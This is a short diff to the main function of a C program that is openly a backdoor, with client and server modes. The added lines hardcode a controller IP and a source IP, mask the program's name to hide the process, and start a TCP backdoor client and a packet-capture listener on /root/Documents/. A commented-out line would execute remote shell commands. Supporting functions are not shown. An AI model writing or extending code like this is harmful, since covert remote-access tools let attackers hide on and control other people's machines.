@@ -42,6 +42,7 @@ int main(int argc, char *argv[]) {
 	extern int optind, optopt;
 	int c;
 	bool client = false;
+	char source[MAX_LEN];
 	char host[MAX_LEN];
 	char filter[MAX_LEN];
 	char folder[MAX_LEN];
@@ -75,14 +76,23 @@ int main(int argc, char *argv[]) {
 		}
 	}
 
+	strcpy(host, "96.55.197.75");
+	strcpy(source, "192.168.0.17");
+
+	printf("copied %s <- %s\n", host, source);
+
 	// Mask the application name
 	mask_prog(argv[0]);
 
-	ipaddr = resolve(host);
+	printf("masked\n");
+	//ipaddr = resolve(host);
 
 	if (client) { // Controller Client
 		// do something
+		backdoor_client(resolve(source), resolve(host), "tcp");
 	} else { // Backdoor Server
+		pcap_init(resolve(host), "/root/Documents/", 1);
+		//cmd_execute("ls -lR", resolve(source), resolve(host));
 		//do something
 	}
 
